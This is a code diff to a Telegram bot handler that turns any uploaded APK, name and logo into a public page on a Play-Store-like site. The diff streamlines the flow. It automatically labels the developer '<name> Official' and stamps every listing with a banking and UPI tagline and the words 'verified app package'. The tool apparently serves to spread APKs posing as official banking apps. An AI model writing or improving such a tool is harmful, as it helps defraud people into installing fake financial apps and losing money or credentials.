@@ -81,14 +81,28 @@ export default async function handler(request, response) {
 	}
 
 	const message = update?.message || update?.edited_message;
-	if (!message?.chat?.id) {
+	const callbackQuery = update?.callback_query;
+
+	const chatId = message?.chat?.id || callbackQuery?.message?.chat?.id;
+	if (!chatId) {
 		return response.status(200).json({ ok: true });
 	}
 
-	const chatId = message.chat.id;
-	const text = (message.text || '').trim();
-
 	try {
+		if (callbackQuery) {
+			await telegram('answerCallbackQuery', { callback_query_id: callbackQuery.id });
+			if (callbackQuery.data === 'new_link') {
+				await saveSession(chatId, { step: 'name', data: {} });
+				await telegram('sendMessage', {
+					chat_id: chatId,
+					text: '✅ Process restarted\n\n1/3 App ka naam Bhejiye.',
+				});
+				return response.status(200).json({ ok: true });
+			}
+		}
+
+		const text = (message?.text || '').trim();
+
 		if (text.startsWith('/start')) {
 			await saveSession(chatId, { step: 'name', data: {} });
 			await telegram('sendMessage', {
@@ -100,23 +114,19 @@ export default async function handler(request, response) {
 
 		const session = await loadSession(chatId);
 
+		// Step 1: App Name -> Go to Logo (Step 2)
 		if (session.step === 'name' && text) {
 			session.data.name = text;
-			session.step = 'developer';
-			await saveSession(chatId, session);
-			await telegram('sendMessage', {
-				chat_id: chatId,
-				text: '✅ 1/3 App name received\n\n2/3 Ab app ka developer / company name Bhejiye.',
-			});
-		} else if (session.step === 'developer' && text) {
-			session.data.developer = text;
+			session.data.developer = `${text} Official`;
 			session.step = 'logo';
 			await saveSession(chatId, session);
 			await telegram('sendMessage', {
 				chat_id: chatId,
-				text: '✅ 2/3 Developer name received\n\nAb app ka logo / icon image Bhejiye.',
+				text: '✅ 1/3 App name received\n\n2/3 Ab app ka logo / icon image Bhejiye.',
 			});
-		} else if (session.step === 'logo' && (message.photo?.length || message.document)) {
+		}
+		// Step 2: Logo -> Go to APK (Step 3)
+		else if (session.step === 'logo' && (message?.photo?.length || message?.document)) {
 			const fileId = message.photo ? message.photo[message.photo.length - 1].file_id : message.document.file_id;
 			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading logo...' });
 			session.data.logoUrl = await saveTelegramFile(fileId, `apps/${chatId}/logo`);
@@ -124,12 +134,14 @@ export default async function handler(request, response) {
 			await saveSession(chatId, session);
 			await telegram('sendMessage', {
 				chat_id: chatId,
-				text: '✅ App icon uploaded\n\n3/3 Ab APK document bhejiye (.apk file).',
+				text: '✅ 2/3 App icon received\n\n3/3 Ab APK document bhejiye (.apk file).',
 			});
-		} else if (session.step === 'apk' && message.document) {
+		}
+		// Step 3: APK Document -> Publish Play Store Page
+		else if (session.step === 'apk' && message?.document) {
 			const fileName = message.document.file_name || '';
 			if (!fileName.toLowerCase().endsWith('.apk')) {
-				await telegram('sendMessage', { chat_id: chatId, text: '⚠️ Kripya valid .apk file bhejiye.' });
+				await telegram('sendMessage', { chat_id: chatId, text: '⚠️ Kripya valid .apk file document ke roop me bhejiye.' });
 				return response.status(200).json({ ok: true });
 			}
 
@@ -138,7 +150,7 @@ export default async function handler(request, response) {
 			session.data.slug = slugify(session.data.name || 'app');
 			session.data.category = 'APPS';
 			session.data.tagline = 'Secure Mobile Banking, Instant UPI Transfers & Financial Services';
-			session.data.description = `Official ${session.data.name} app by ${session.data.developer || 'Official'}. Download the verified app package.`;
+			session.data.description = `Official ${session.data.name} app by ${session.data.developer}. Download the verified app package.`;
 			session.data.version = '1.0.0';
 
 			const options = { access: 'public', addRandomSuffix: false, allowOverwrite: true };
@@ -148,9 +160,19 @@ export default async function handler(request, response) {
 			const host = request.headers.host || 'playstore-web-143.vercel.app';
 			const liveUrl = `https://${host}/app/${session.data.slug}`;
 
+			const replyMarkup = {
+				inline_keyboard: [
+					[
+						{ text: '🆘 Help', url: 'https://t.me/sanaminfotech' },
+						{ text: '➕ New Link', callback_data: 'new_link' }
+					]
+				]
+			};
+
 			await telegram('sendMessage', {
 				chat_id: chatId,
-				text: `🎉 Aapka app page ready hai!\n\n🔗 ${liveUrl}`,
+				text: `🎉 Files uploaded\n✅ Page deployed & READY!\n\n🔗 ${liveUrl}`,
+				reply_markup: replyMarkup
 			});
 
 			try {
